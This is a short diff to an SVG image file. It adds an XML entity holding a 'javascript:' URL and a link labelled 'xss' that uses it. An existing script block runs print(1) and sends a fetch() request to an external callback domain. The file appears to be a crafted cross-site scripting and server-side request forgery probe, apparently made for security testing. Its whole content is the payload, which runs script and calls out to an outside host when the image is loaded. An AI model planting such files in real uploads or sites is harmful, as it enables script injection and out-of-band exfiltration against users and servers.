@@ -1,5 +1,12 @@
+<!DOCTYPE xml [
+   <!ENTITY payload "javascript:print(1)">
+]>
+
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009990" stroke="#004400"/>
+   <a href="&payload;">
+      <text >xss </text>
+   </a>
    <script type="text/javascript">
       print(1);
       fetch('https://mugne1by.ssrf.cvssadvisor.com')
